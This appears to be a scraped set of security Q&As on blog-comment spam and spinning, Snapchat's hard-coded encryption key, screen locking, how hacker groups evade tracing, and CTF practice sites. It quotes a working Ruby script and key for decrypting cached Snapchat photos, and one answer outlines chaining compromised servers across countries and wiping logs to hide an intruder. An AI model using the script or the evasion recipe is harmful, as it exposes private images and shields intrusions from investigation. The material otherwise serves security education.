  Thanks for any other informative blog. Where else may I am getting
  that kind of information written in such an ideal means? IΓÇÖve a
  project that IΓÇÖm simply now working on, and I have been on the look
  out for such info.


Is it just that basically all blog spam comes from non-English speaking countries, or is there some kind of tactical decision being made about the language? I ask because when I first saw it, I thought perhaps they were being genuine but inarticulate.
AnswersKenntnis
AnswerKenntnis:
The spammers are automatically generating new comments by taking existing comments and running them through a thesaurus program that replaces words with synonyms or related parts of speech. The result is a sentence which makes sense, but has word choices that no native speaker would ever make:


  Where else may I am getting ...


is clearly not something a native speaker would write, but 


  Where else could she be getting...


is, and can be transformed by a simple substitution of pronouns and synonyms into the spam text.

This way, even if anti-spam forces have a huge database of known-spam comments, the spammers can generate infinitely many new ones that are plausibly English. 

I long suspected this was the case but I recently got proof. I now occasionally get comment spam containing the entire substitution script; it'll be something like:


  I can't [believe/understand/comprehend] the [great/superior/amazing] [content/information/data]...


Since the spammers were likely non-English speakers to begin with, they didn't notice they were sending the script rather than the output.

If you examine a large enough corpus of spam, you can pretty easily figure out what algorithms they're using. It would be an interesting challenge in reverse engineering to write a program that deduces the algorithms used from the corpus.


  I ask because when I first saw it, I thought perhaps they were being genuine but inarticulate.


They fooled you once. It probably won't happen again!

Commenter TildalWave points out:


  none of the sample spam messages OP posted actually endorse any products, or are otherwise promoting any other cause.


Well let me give you an example: here's a comment that arrived a few minutes ago on my blog:

user name:  cuisinart compact toaster review
user url:   toasterovenpicks.com
user email: jeffryshuler@2-mail.com
user IP:    37.59.34.218 
Comment contents:
One in particular clue for that bride and groom essential their
own absolutely new everything, actually a surname burned which has a mode,
which render nearly girl thankful recognizing their refreshing surname
therefore distinctively printed.


The product is promoted in the user's metadata, not in the content of the comment. The content is just an attempt to get past the spam filter.  (I suspect that in this case the text is not a mutation of an existing text but rather generated by a Markov process over a corpus of documents about wedding planning.)

Obviously anti-spam forces are on to this one too, which is why this was in my spam filter. My spam filter (akismet) on average lets through one spam for every 705 submitted. Again, that's what spammers are going for; they know that 99.9% of their work will never be seen by anyone. They're trying to randomly explore the space of false negatives in spam filters, a space which is getting quite small indeed.
AnswerKenntnis:
The language may have a little to do with a sig like TidalWave was talking about.

A little harmless spamdexing.

I've been getting a few of the first example on my blog. While it looks harmless, they're actually spamdexing (a little bit of "black hat seo") by trying to associate their user account (and website links by extension) with the keywords in the blog (like Xander was saying, it's marketing). When you click on the link it counts as a positive hit from the blog. If a blog has enough hits positively for a key search their link will get a +1 bump up from the search engines in regard to relativity for the keywords. Most of the search engines have caught onto this and try to prevent it with relevance matching in their formulas.

The downside is if a user comes to your site for something off-topic because of this spam and leaves (bounces) the search engines will penalize your ranking overall (because of lack of substance) as well as your ranking for the page with the off-topic content. While there's not a lot to do with IT Security in spamdexing (unless they use an infected site as their own URL), it does impact the [social] performance of the site negatively overall if enough spammers do this and knock your site down in the rankings.

In regard to the second example it contains a hook for a two post spam operation (Commonly found in forums). The first poster will create an account and post a question that looks like a legitimate concern.


  ... Where else may I am getting that kind of information written in
  such an ideal means? ...


A short while later (within 20 minutes or so, up to even a couple of days) another poster (from the same country usually, if not the same IP range) will create a new account and post the answer, which contains the link in relevance to the original poster's question. Since most board moderators won't delete what looks like a real discussion, their spam fools someone again... it's still spamdexing though. A better-crafted marketing-style example might be:


  I found a great resource for [keywords here] at
  [http://www.example.com/]. You should take a look since they have a
  lot of information related to [more keywords]. It should help you out.


Some of the other tricks they'll do is have a signature image that is a transparent GIF only 1 pixel by 1 pixel and wrapped in an <a> tag. This creates a link to some other website anywhere the poster has typed out their gibberish content. Just because you can't see it, doesn't mean it's not there.

Not so harmless Spam Threats impact Server Security

Some of the worst examples of spam will actually contain a link to an infected site, or they'll install a javascript keylogger. (I've seen the SVG hack used in signature lines to inject malicious script.) The keylogger is the one you'll need to watch-out for because they can capture the username and password of the blog/site admin or another user with elevated privileges when they try to log in (or any user creating an account) on the same page to delete the spam. Best case scenario, is if the user has enough access to see other users, the attacker will download the list of e-mail addresses from the users and send out spam e-mail messages to a market-targeted (marketing) list.

Innocent new users can have their credentials stolen, and since most people use the same passwords and the same e-mail address everywhere, now their accounts elsewhere can be compromised. (Facebook, LinkedIn, etc)

Worst case scenario, because most web developers of the CMS systems don't expect someone with "skillz" to get into the backend via one of these methods (trusted), they're not doing things like checking all of the admin forms for XSS or MySQL Injections (I've caught a few of my developers cutting corners in this method). From XSS to SQL injection it then depends on the security of the box, the limitations on the user accounts (don't run Apache as root), and the read/write access. Since they would be in the CMS you can assume that the user can likely write anything to the box they want. Delete the database, infect the site with a backdoor... now it's an IT security issue.
AnswerKenntnis:
I don't know if in your case the text you reported was the entire comment (what would then be its purpose, either as a genuine comment or as spam/scam?).

In case it was not ΓÇô and when the spam needs to work as a prelude to future interaction ΓÇô then writing it in poor english might be done on purpose, as a "check" for a victim that is dumb enough not to immediately recognise the scam and hence worth investing time on.

Source: Why do Nigerian Scammers Say They are from Nigeria? by Cormac Herley, Microsoft Research.
AnswerKenntnis:
My company used to do "spinning", which as one of the answers above mentioned is programatically doing thesaurus search and replaces on the text. However, we would do it in multiple, complex layers.


We actually employed real, American writers to write the original copy.
Those original writers would mark up their own document using a special syntax that we created, marking words, word groupings, phrases, and entire sentences, including the synonyms that they felt were appropriate for each case. This meant synonyms for entire phrases that could be exchanged without changing meaning. They would do this in a text editing software we created that would provide them with auto-complete suggestions.
Each time a writer would mark up their document, we would store all of their synonyms and phrases in a dictionary and use them to add suggestions to the writer for their next assignment.
Hit GO on the machine, and spin out hundreds/thousands of variations. 
Divvy out blocks of variations to our SEO team in the Philippines whose sole job was to find high PR blogs, forums and other websites too dumb to block us.


Interestingly, we never automated the actual posting part, since that was the easiest thing for machines to spot. A real human was posting that trash.

Ah, the good old days of ruining the internet for everyone.
AnswerKenntnis:
It is probably a combination of the two.  If they use language that doesn't properly make grammatical sense, there is more likelihood someone might misinterpret it as actual feedback on a post since they'll try to fill in the blanks in a way that makes sense.  Ultimately most of this kind of spam is trying to spread links around the web to try and impact search rankings.

In order to get links to stay up, they need their comments to look genuine to make them harder to easily pull out from genuine comments.  They make generic sounding responses that "could" plausibly be valid in the hope that they will be left active.

In other situations, this is the result of trying to insert keywords in to the comment so as to increase the association of the link with those keywords.
AnswerKenntnis:
Maybe this won't answer the OP's question but those spams are not meant to make anybody buy anything. 

The point is to create the maximum number of comments with links to particular pages or sites that spammers want to improve their PageRank. Those sites are where the real work of seducing potential buyers (or hacking computers of potential victims, or both) will take place. 

That's why almost every spam has at least, one link. And when it doesn't, it's generally a specially crafted comment ("A brilliant article," "Thank you for sharing this" ...) where the goal is to get the comment approved and to grant the bot with direct access without passing the moderation queue. Because in some CMS and forums, when a user reaches a minimum number of approved messages, it will be 'tagged' as trusted and need not to get approved every time.

So spam is not meant for humans but for machines (search engines) and spammers need to make as much as they can to influence search engines. So, they do not waste time on the content, since no human will read it, and concentrate on mechanisms that make a lot of messages faster and simpler.

In a word, you're are not the target, you are just a collateral damage.
AnswerKenntnis:
In addition to the fine answers posted above there is a strong sampling bias to your question.

You only recognize poorly crafted spam blog posts as blog spam.  You never recognize the really well crafted blog spam as blog spam.  Hence it seems that all blog spam is poorly crafted.

AmIRight?
AnswerKenntnis:
Quite often blogspammers use content spinners. They replace words with synonyms, which should work in theory, but in reality it makes the comment look like written by a 4 year old; or someone who does not have english as first language. 

Most content spinners share a common syntax (example from Eric Lippert's answer):

I can't [believe/understand/comprehend] the [great/superior/amazing] [content/information/data]...


This means the content spinner will choose one random word from each bracket to build the sentence. This way you can get a large variety of similar comments, without having exact duplicates, making it a bit harder for anti spam plugins to identify similar content if they use a checksum like md5 to compare comments with previous spam.
AnswerKenntnis:
They may be going off templates like this: https://gist.github.com/shanselman/5422230 , which was recently accidentally posted to Scott Hanselman's site: http://www.hanselman.com/blog/ExposedABlogCommentSpammersSourceTemplate.aspx

As others have mentioned, all that needs to be done is to write a script to pull a word at random out of the bracketed lists.
AnswerKenntnis:
It can be said simply that you must be aware of SEO(Search Engine Optimization)
IT has 2 types of techniques in major 1) Black Hat and 2) White Hat

White hat do the genuine way or authentic work.

but where black hat comes your problem starts, what they do is they have created number of user name , password, or list of open blogs... they keep on posting content on the basis of their requirement( keywords) so that will give them inward clicks on their site.. 

As the first answer says they use smart software that understand language partially, and create a paragraph on the basis of given keywords.

So, that will make some sense, but will not make sense at all... :)

I hope this makes sense in context to your question..
QuestionKenntnis:
Why can we still crack snapchat photos in 12 lines of Ruby?
qn_description:
Just came across this bit of ruby that can be used to decrypt snapchat photos taken out of the cache on a phone, apparently adapted from here. To my surprise, it worked no problem, considering the problems around snapchat's security which have been well publicized lately (Mostly the stuff around the whole phone number/username leak as far as I recall).

require 'openssl'

ARGV.each do|a, index|
    data = File.open(a, 'r:ASCII-8BIT').read
    c = OpenSSL::Cipher.new('AES-128-ECB')
    c.decrypt
    c.key = 'M02cnQ51Ji97vwT4'
    o = ''.force_encoding('ASCII-8BIT')
    data.bytes.each_slice(16) { |s| o += c.update(s.map(&:chr).join) }
    o += c.final
    File.open('decyphered_' + a , 'w') { |f| f.write(o) }
end


So, my question is, what exactly are they doing wrong here, and what could they be doing better in order to improve the security of their application in this regard rather than what they're doing now, considering that people often send intimate things that were never meant to be shared for longer than 10 seconds only to one person, and also considering the popularity of this app?

tldr/for all those who dont really care to know how computers work but still want to know what is up: Basically, let's say you have 40 million people who use snapchat, with 16.5 million users sending each other pictures, and each picture in its own tiny locked safe every day. Now, what if you gave those 16.5 million people all the same flimsy, plastic key to open each and every one of these lockboxes to capture the snapchat media?
AnswersKenntnis
AnswerKenntnis:
This is a serious problem in password-management. The first problem here is the way they managed his key in their source code. SnapChat states that they send the photos encrypted over internet, and it is true after all, but they are using a "pre-shared" key to encrypt this data (badly using also AES in ECB mode) so, every user around the planet has the key to decipher each photo. 

The problem here is, how did internet get the key? Piece of cake, they just included it in every app, and somebody just searched for it. 


  What is this magic encryption key used by any and all Snapchat app?        
  
  M02cnQ51Ji97vwT4                                                          
  
  You can find this (in the Android app) in a constant string located
  in com.snapchat.android.util.AESEncrypt; no digging required, it is
  quite literally sitting around waiting to be found by anyone.              
  
  On a more positive note (perhaps), in the 3.0.4 (18/08/2013) build
  of the Android app, there is - oddly enough - a second key!                
  
  1234567891123456                                                          


It is a very bad practice to hardcode a password in your source (no matter if it is in your headers or in your binaries), the main problem being anyone could find it with a simple "strings" command into your binary (or by looking in someplace you used to share your code with your friends):

strings binaryFile


Then the malicious user can have a look to each string and check if that is the password he is looking for. So, if your really need to hardcode a password in your code you better hide it, but this will just be "security through obscurity" and the malicious user will end up finding the key (so you better think in a different approach). 

What can they do to improve their security? Well they could have generated a key for each photo, or they can pre-share a key between the clients that are going to share a picture, public/private keys; there are plenty of options.
AnswerKenntnis:
Because this is a fundamental principle of information theory.

If a machine can decrypt a piece of information and keep it for ten seconds, it can decrypt it and keep it forever.

Any attempt to disguise this is simply smoke and mirrors.
AnswerKenntnis:
The code is not "cracking" the encryption.

You are merely decrypting the data with the correct encryption key which was obtained by reverse engineering the application. 

How could they do better? Not hard code the encryption key for one.
AnswerKenntnis:
Because it's not supposed to be impenetrably secure.  Snapchat is for sharing, which is antithetical to securing.

I think they have implemented what they consider to be "enough" security for their model.  They aren't too concerned about photos lasting longer than a few seconds, because people can always copy them via the analog hole.  This encryption prevents people from simply saving the files to show to their friends, so they have to do a bit of extra work. This simple step protects over 99% of their photographs well enough.
AnswerKenntnis:
By design. I do not think the number of lines is relevant. Nor do I think the language is relevant. 

The question simplified is "Why can anyone decrypt these". 
The answer - because that was the intent.

The background is that the encryption may only be lip-service, in the same way that encrypted .pdf's are often sent with four letter dictionary words as passwords.

There is security, but it is circumventable at some token level of effort. The layperson has no clue. We know better. (We know that in a post Snowden world we cannot be sure we can trust SSL protected websites.)

In short, it is a plastic padlock to satisfy the promise of encrypted transmission.
AnswerKenntnis:
"So, my question is, what exactly are they doing wrong here"

That one is easy, they are promoting a false sense of security in people that are not familiar enough with the technology that they are willing to to trust sending information that would otherwise be considered private, to strangers...

That is the real flaw in the design.

Instead of making more convenient ways to do this, they should assisting in the raising of smarter generations, or just disclaimer the install so the self inflicted victims cannot cry foul.

There are solid, tried and true encryption and transmission methods for internet communications, and the end goal is that if you want security get security, if you want the chance of interception, redistribution, and poor coding practices, then download whatever is hottest on the app store this week...

Security is not convenient, it is generally not fun, and it is not simple. all the things that kill a fly by night app.

Personally I would be MUCH more concerned with the developer having access in mass quantities over individual attacks...
AnswerKenntnis:
The problem with snapchat is that they are doing plain crypto while in fact they need DRM. The latter involves more topics than simply encrypting your data, you need for example hide your keys from your user. It looks that they failed on this one.
AnswerKenntnis:
Bad practice combined with depreciated security standards have opened up this vulnerability.
Especially given Snapchat's 'mission' of making the images, texts, etc. non-reproducible and only viewable once, a better approach would have been to randomly generate a PSK on every boot and use that for the duration that the app is running, rendering it's data useless upon every relaunch. And yes, as many others have said, hard coding a security key directly into an application's code is very, very bad practice and one that could be easily avoided.

Summarising, to easily resolve this issue:

Use a randomly generated string (and a better encryption algorithm, although this poor choice may be somewhat related to the lower processor requirements and the primary target audience [younger people] who are more likely to have dated smartphones) as SSL pre-shared key which cycles on every boot, rendering the cache useless upon app relaunch.

Very easy to resolve, really. Sounds like they could do with some consultancy around security best practices.
AnswerKenntnis:
So, I called snapchat out to reply to this question I've asked in their support, and got this instead. So, after a bit more than a few days, here is Snapchat's official reply to a support request with me linking to this post, and asking if they could weigh in with an honest reply to this question themselves. I personally consider this pretty much the weakest reply I could have gotten next to nothing at all, and an indication of dysfunctional regard of security practices and not to mention public relations:

Team Snapchat replied:
Hi Dmitri,

Thank you for sharing your concerns. We remain committed to maintaining 
the security and integrity of the Snapchat community.

Best,
Tobias


Thanks, snapchat!
QuestionKenntnis:
Why do we lock our computers?
qn_description:
It's common knowledge that if somebody has physical access to your machine they can do whatever they want with it1.

So why do we always lock our computers? If somebody has physical access to my computer, it doesn't really matter if it's locked or not. They can either boot a live CD and reset my password or read my files (if it's not encrypted), or perform a cold boot attack to get my encryption keys from memory (if it is encrypted).

What's the point of locking a computer besides keeping the average coworker from messing with your stuff? Does it provide any real security benefit, or is it just a convenience to deter untrained people?



1. unless the computer has been off for a while and you're using full-disk encryption
AnswersKenntnis
AnswerKenntnis:
In some places they have a saying: "opportunity makes the thief". All you're doing by screen-locking a computer is making the cost of hacking it just a little bit harder.

Security is an economic good, with a price and a value. The value of locking is somewhat larger than the price of locking it.  Sort of like how in good neighborhoods, you don't need to lock your front door. In most neighborhoods, you do lock your front door, but anyone with a hammer, a large rock or a brick could get in through the windows.  In some neighborhoods, not only do you lock the door, you have a solid-core door with a deadbolt, and you have steel gratings over the windows.  In the best neighborhoods, the value of the steel gratings isn't worth the price, but in bad neighborhoods, the value does exceed the price.
AnswerKenntnis:
It's a risk management thing, really. An attacker with a short window of opportunity (e.g. whilst you're out getting coffee) must be prevented at minimum cost to you as a user, in such a way that makes it non-trivial to bypass under tight time constraints.

Hitting WinKey+L or clicking the lock button is next-to-zero cost for you as a user. Taking the time to reboot the machine, load up a live CD and extract the data (e.g. documents, SAM database, etc.) is not a short process - it's at least a 10 minute job and the reboot alerts you to a potential problem. The cost for the attacker is significantly greater than the cost for the user.

It's also a great way to prevent the casual attacker - e.g. the journalist you leave in your office for 5 minutes whilst you take a work call. If they see your computer unlocked, with all its data immediately available, they may take the opportunity. If they see that it's locked, they won't bother. 99% of visitors do not come equipped with data exfiltration equipment!
AnswerKenntnis:
Locking your computer prevents surreptitious snooping or alteration. If you don't lock, it is easy for someone to poke around inside your session in such a way that you will not notice it when you return to your machine.

The security benefit is real because there is a class of attacker who wants access without leaving any trace whatsoever. For that class of attacker, rebooting your machine and messing with your password are not options, unless that attacker is confident that he or she can restore your computer to very closely resemble the state in which you left it.

It is one thing for security to be compromised, and another for it to be compromised without a trace.

There is an analogy there with physical security. If you don't lock your doors and windows, then a thief can enter your house without leaving any trace of entry. The thief can steal something such that you do not even notice that it's missing until much later, perhaps months, if not years. One day it occurs to you, "Don't I own such and such a thing? Now where is it?" then waste time looking for something that, unbeknownst to you, was stolen long ago. Insurance people call this situation "mysterious disappearance".

If a thief does enter, it is better if there is evidence of forced entry.
AnswerKenntnis:
"What's the point of locking a computer besides keeping the average coworker from messing with your stuff?"

By protecting your self from average coworker you've protected your self from largest subset of people who'd want to find something personal about you or do you harm.
AnswerKenntnis:
In most environments where it is necessary to lock your computer, what you are protecting isn't on your computer, but on networked computers which you have access to through your credentials.  So a quick boot using a CD doesn't directly give the attacker anything useful, it is just a single step.  While you are right that ultimately this isn't a barrier to a determinined attacker, it is a barrier to a an opportunistic hacker.

Think of a bank teller computer -- if you are making a deposit and they were to walk away at the point of confirming your deposit amount it would be easy to go ahead and complete the transaction with 10,000 instead of 10 dollars.  If the computer is locked, even after they reboot, they won't have the same access.
AnswerKenntnis:
Security is not only about the document located on your computer. Without a proper authentication to the company, someone having access to your machine should not have access to your emails (unless stored locally) and can't access network resources with your name.

When we say that having physical access is like losing this machine, it also implies that the attacker have time to act. If the attacker does not have time, he can't possibly boot an offline password breaker to change your password, access your data and getting what he wants. Furthermore, the process is destructive and alarm will be given as soon as you find your account has been accessed. 

An other scenario would be if the attacker want to get something that is not stored on the computer, for example your password for a given application (corporate or private). Physically breaking in is not an option, as he wants to remain stealth. Howerver, if you provide the attacker with a sufficient window of time to install a keylogger.

In term of risk, it is also more probable that someone will attack your unlocked session, rather to steal or break physically your machine. Thus, it is a good measure to lock your session whenever you leave your office/desk.
AnswerKenntnis:
In addition to all the other answers, think about skill.  If I come across an unattended, unlocked laptop, it takes no particular skill to send an email from that computer to the Company President; that email can range from prank to criminal activity.   The other attacks you describe require a bit more skill.

Reinforcing what others have said, security is risk management. We need to compare work factor to deploy the control to the impact it has on the adversary's work factor.  Locking the computer is very low work factor, but forces the attacker into an attack script that requires more time and skill.
AnswerKenntnis:
It takes time to boot to a live CD
Modifying the hardware will attract attention whilst simply using someone else's PC won't
More people will attempt to use an unlocked PC then a locked one in the same way you're more likely to have your bike stolen without a bike lock than with an unlocked bike lock on it.
AnswerKenntnis:
You can't ever make something completely secure and still make it accessible.  Therefore, you can't ever prevent anyone from gaining access to your computer system.  All you can do is make it harder for them to gain access.  And in the case of locking your screen, a simple two-second stroke of the fingers can bring great inconvenience to someone wanting access.  You effectively, exponentially increase the skill, cleverness, and knowledge required to gain that access.
AnswerKenntnis:
I'm no security expert by any stretch - but this really just seems like common sense. The average criminal isn't an Eastern-bloc spy; they just want to pick the low-hanging fruit from a tree in someone else's yard. If you lock it up, you push the fruit to a higher branch.
AnswerKenntnis:
Locking the workstation impedes anyone's attempt to accidentally peek into your documents, email or pictures. There is a difference between locking and making something hackproof!
AnswerKenntnis:
Usually other people in your office are annoying gits - it doesn't always matter about security, it may just be something annoying - changing a wallpaper or similar!

... just see this for ideas - http://superuser.com/questions/275894/how-to-mess-up-a-pc-running-windows-7
AnswerKenntnis:
Another commonly omitted aspect of locking your computer is dismissing others from liability. The principle is similar to why you avoid leaving your password written on a piece of paper on your desk. By not doing that you're not only protecting your privacy but you are also protecting others from getting accused of knowing it. Because you reduce the probability of that happening significantly.

Their intent doesn't have to be malicious either. Someone's computer might be broken and yours could be the only computer unlocked, so he could assume that as "available" and do his work on your machine and accidentally destroy all your work. Locking your computer saves them from the responsibility. 

Of course a computer can be breached even when locked by advanced users similar to how someone can guess your password by just trying your cat's name. By locking your computer, however, you change the odds in both your and your colleagues'/roommates' favor.
QuestionKenntnis:
Why is it difficult to catch "Anonymous" or "Lulzsec" (groups)?
qn_description:
I'm not security literate, and if I was, I probably wouldn't be asking this question. As a regular tech news follower, I'm really surprised by the outrage of Anonymous (hacker group), but as a critical thinker, I'm unable to control my curiosity to dig out how exactly they are doing this? Frankly, this group really scares me.

One thing that I don't understand is how they haven't been caught yet. Their IP addresses should be traceable when they DDOS, even if they spoof it or go through a proxy.


The server with which they are spoofing should have recorded the IPs of these guys in its logs. If the govt. ask the company (which owns the server) don't they give the logs? 
Even if it is a private server owned by these guys, doesn't IANA (or whoever the organization is) have the address & credit card details of the guy who bought & registered the server?
Even if they don't have that, can't the ISPs trace back to the place these packets originated?


I know, if it was as simple as I said, the government would have caught them already. So how exactly are they able to escape? 

PS: If you feel there are any resources that would enlighten me, I'll be glad to read them.

[Update - this is equally appropriate when referring to the Lulzsec group, so have added a quick link to the Wikipedia page on them]
AnswersKenntnis
AnswerKenntnis:
My answer pokes at the original question. What makes you think that they don't get caught?

The CIA and DoD found Osama bin Laden.

Typical means include OSINT, TECHINT, and HUMINT. Forensics can be done on Tor. Secure deletion tools such as sdelete, BCWipe, and DBAN are not perfect. Encryption tools such as GPG and Truecrypt are not perfect.

Online communications was perhaps Osama bin Laden's biggest strength (he had couriers that traveled to far away cyber-cafes using email on USB flash drives) and Anonymous/LulzSec's biggest weakness. They use unencrypted IRC usually. You think they'd at least be using OTR through Tor with an SSL proxy to the IM communications server(s) instead of a cleartext traffic through an exit node.

Their common use of utilities such as Havij and sqlmap could certainly backfire. Perhaps there is a client-side vulnerability in the Python VM. Perhaps there is a client-side buffer overflow in Havij. Perhaps there are backdoors in either.

Because of the political nature of these groups, there will be internal issues. I saw some news lately that 1 in 4 hackers are informants for the FBI.

It's not "difficult" to "catch" anyone. Another person on these forums suggested that I watch a video from a Defcon presentation where the presenter tracks down a Nigerian scammer using the advanced transform capabilities in Maltego. The OSINT capabilities of Maltego and the i2 Group Analyst's Notebook are fairly limitless. A little hint; a little OPSEC mistake -- and a reversal occurs: the hunter is now being hunted.
AnswerKenntnis:
From some experience with law enforcement and forensics, I can say one of the biggest issues is that ISPs really don't want to have to track users. Once they get beyond a certain level of management they lose 'common carrier' status and become liable for an awful lot of what their customers may do.

Also, many countries do not want to pass on information to another country - especially countries which may be opposed to western culture or western interference.

And it is extremely easy to hide almost anything on the internet.

Regarding your three points:


Server should have IP addresses - No - this is simple to spoof or erase
Private server - Not likely, although possible - but it wouldn't
be their credit card used
ISP's trace - Not going to happen - it doesn't affect ISP's negatively, and is way too difficult


update It might happen after all - http://blogs.forbes.com/andygreenberg/2011/03/18/ex-anonymous-hackers-plan-to-out-groups-members/
AnswerKenntnis:
One of the most important aspects of an attack like this is covering your tracks.  There are lots of different ways to do this, as it depends on the technology.  To address your specific questions:

When they DDoS: If the flood was coming from their own machines, then it would be fairly easy to track them.  The problem lies in the fact that they aren't using their own machines.  They are either a) taking control of someone elses without permission, or b) getting someone to do it on their behalf.  The latter is what happened with the Wikileaks attacks.  People signed up to to do it.

Things start getting hinky when servers are in countries that don't generally respond to requests for logs.  If the company that is being attacked is in the US, it's fairly easy to get a court order if the attack can be proven to originate in the States.  What happens if it's a US target, but the attack is originating in Russia or China?  The same thing goes for purchase records.

As for being scared... there are quite a few of these sorts of groups out there.  Most of them are (I don't want to say harmless, but...) harmless.  In this particular case, someone poked the bear and the bear got pissed.

EDIT: Not that I condone their actions, blah blah blah.
AnswerKenntnis:
In addition to the answers that have already been given, another reason it is so hard to catch anonymous is because anonymous can be anyone, literally.  I mean this in two ways. First, hackers can use a combination of malware, spyware, and bots to access and use/loop through other peoples computers anywhere in the world; thus, making any computer, theoretically, a point from which anonymous can work.  Secondly, true to the name anonymous, any hacker, anywhere, using any method or style, using any random pattern of activity, can make their attack and call themselves anonymous.  Thus, it is extremely difficult for a government/authority to track activity by pattern or style or signature, because it is always changing due to the varied nature of the attacks since it can, as I said before, literally be coming from anyone.

Essentially,

Anonymous is not one person...
Anonymous is not one group...

Anonymous is anywhere and everywhere...
Anonymous could be everyone or no one...

Unfortunately, that is the nature, uniqueness, and genius of the name.
AnswerKenntnis:
There are NUMEROUS ways for a hacker to cover their tracks..

Here is one very generalized example:

A hacker can compromise a third party machine and use it to do attacks on the hackers behalf. Because the system is compromised, the hacker can delete/modify logs. A hacker can also piggyback machines, such as, log into machine A, from machine A log into machine B, from machine B log into machine C, from machine C attack machine D, then cleanse the logs for machines C, B, then A making tracking the hacker more difficult.

This doesn't even take into account hacked internet accounts (so even if traced back they point to a different person), open proxies, etc etc etc..

I know the above isn't flawless, but like I said this is just a VERY VERY general example. There are many many ways to cover your tracks.

That said, what makes you so sure certain 3 letter agencies don't already know who many of them are, but don't make a move on them so that those individuals can lead them to others?

I'm sure others will chime in who can explain more thoroughly, but I think the ultimate lesson to be learned is to concern yourself less with specific hackers and hacking groups, and more with your own security. The fact that their latest claim to fame originated from something as TRIVIAL to fix as a SQL Injection vulnerability (which is nothing new, very well documented and understood) is a huge discredit to the unnamed "security firm" who was hacked. rant over
AnswerKenntnis:
Well I responded to some posts above that had incorrect information, but I figured I should just post my own response to better explain.

Anonymous is made up of basically 2 subgroups: 


Skiddies (script kiddies) and newbies who have only the most basic security knowledge, and just sit in their IRC and basically be the pwns for the attack.  These are the people that the FBI was knocking down their doors.  
Anonymous core leadership, a group with some hacking knowledge that owned hbgary, but also got owned recently by ninja hack squad.  You won't be able to trace this subgroup unless you are a security guru.  


How do they hide their tracks?  

Like a previous answerers mentioned, 


Through proxy servers like TOR
by compromising boxes and launching attacks from those boxes (basically masquerading as that person's IP), or 
by using a VPN that's in a foreign country and keeps no logs.  With the VPN, all your traffic is relayed through it so wherever you connect it can only track back the IP addy to the VPN itself and no further (unless the VPN is keeping logs in which case you shouldn't use it anyways).  


Hope this helps clarify a bit.
AnswerKenntnis:
Ars Technica just posted an article: "How the FBI investigates the hacktivities of Anonymous". It contains some information about how they go about tracing the members, and why it's hard.
AnswerKenntnis:
The thing about a DDoS is that you use other people's IPs, not your own. It's relatively simple to become untraceable on the Internet -- just route your traffic though a host that is not keeping traffic logs. As someone who frequently has to try to track these people down, I can tell you what an impossible nightmare it is. Here's the pattern I frequently see:


Select a relatively recent exploit in some web software package (e.g. joomla extension).
Use google to find an appropriately vulnerable attack target
From some location that can't be traced to you (e.g. coffee shop), execute the attack to gain control over the vulnerable server, but don't do anything else that would draw attention to yourself. (bonus points, fix the vulnerablity so no one comes in behind you). Delete any logs that might trace back to your presumed location.
Repeat the above, relaying your traffic through the previously compromised server. Repeat again several times until you're removed multiple steps from the machine that will be behaving as your proxy. Ideally these servers should be located in countries like China, India, Brasil, Mexico, etc., where datacenter techs tend to be uncooperative toward investigations, and should all be located in different countries as to create jurisdiction and communication nightmares for the people trying to track you.


Congratulations, you're now anonymous on the Internet. It's a bit like TOR, except none of the nodes know they're participating. Usually these attackers set up and use backdoors on servers for which no logs or records are kept (since the backdoor presumably doesn't exist). Once the attacker disconnects, that link becomes permanently untraceable. 

One hop drops your chances of detection dramatically. Two hops makes detection almost impossible. Three hops and it's not even worth the effort.
AnswerKenntnis:
Maybe you should read this PDF. They are not so anonymous. The LOIC tool used for DDOS, leaks the original IP of the person using it. You can use the browser (javascript) version of the same tool, maybe hiding behind TOR.

HBGary Federal exposed their names and addresses in that PDF. That is why they attacked his site, email, wipe his ipad, took over his twitter etc....
Search the #hbgary hashtag on twitter for more info on that.
AnswerKenntnis:
Several post discuss the technical difficulties in finding the persons behind these groups. It is not at all easy to backtrack their activity when using many machines to create a sense of anonymity.

Another very important aspect is that the police, the intelligence communities around the globe and the different counties legislation is not really constructed to handle these situations. So if you find a server in one country that has been used to hop to a server in another country it takes too long to go through the proper channels to get the local police to get hold of the information. Even if you do the information such as logs are not always kept for longer periods of time.

It's easy to unlawfully hop around the Internet, but much much slower to hop around the Internet in a lawful way. This is a very prohibiting factor when trying to find these groups.
AnswerKenntnis:
Here is an article asking (and answering) just that very question from the Scientific American site posted this month.  The short answer to the question is spoofing of source addresses and the use of proxies.
AnswerKenntnis:
There is one thing that hasn't been mentioned yet: the human factor.

These groups do not have a hierarchy as such, instead they form around a set of ideas. Most of the time, the only idea in common is "the governments are wrong, we must do justice by hacking", which is probably a feeling that's only getting stronger, with the current pressure the US gov (itself pressured by corporations) is putting in other countries below the covers to pass draconian laws against free speech that could harm the aforementioned corporations.

So the great appeal here, especially by Anonymous, is that if you have the knowledge and hate the government (who doesn't?), you can join them by yourself and on your own account and risk. 

In order to see where this thinking comes from, I recommend the movie/comic novel "V for Vendetta", from which they took that mask you see so often.

Some groups, of course, have much less heroic intentions. LulzSec was "all for the lulz".

The bottom line is that yes, they might get a few members of each group, but more will show up.
QuestionKenntnis:
What "hacking" competitions/challenges exist?
qn_description:
I have always enjoyed trying to gain access to things I'm not really supposed to play around with. I found Hack This Site a long time ago and I learned a lot from it. The issue I have with HTS is that they haven't updated their content in a very long time and the challenges are very similar. I'm no longer 13 and I want bigger and more complex challenges.

I was thinking about chalanges like Cyber Security Challenge and US Cyber Challenge (@sjp wrote about these on the meta)

Also, are there any big social engineering competitions besides the one at Def Con?

Curent list:

Wargames:


Over The Wire They have lots of small hacking challenges like: analyze the code, simple tcp communication application, crypto cracking.
We Chall We Chall is similar to Over The Wire. Lots of challenges. They also have a large list of other sites with similar challenges.
Smash The Stack
spider.io


Downloads:


Damn Vulnerable Web Application
Google Jarlsberg
exploit Exercises


Competitions:


DC3 Is the DOD:s Forensic Challenge. It's an annual competition with different scenarios that you gain points for solving.
NetWars Offers tournaments at some conferences. And one longer challenge over 4 months. With scenario challenges.
Cyber Security Challenge Needs description
US Cyber Challenge Needs description
Codegate Quals


CRT:


iCTF iCTF is a capture the flag contest held once a year.
PlaidCTF
Hack.lu CTF 2012
Defcon Quals
RuCTFe


Other list like this one:


http://captf.com/practice-ctf/
http://www.stumbleupon.com/su/1YNSxi/www.brighthub.com/internet/security-privacy/articles/77093.aspx/
http://www.wechall.net/challs


Other interesting sites:


http://captf.com/, calendar
http://facebook.com/hackercup




Please help me add more to the list.
AnswersKenntnis
AnswerKenntnis:
I don't know a good reference to point to for further reading. Thus I will try to list a few time-wasters that I personally enjoy.

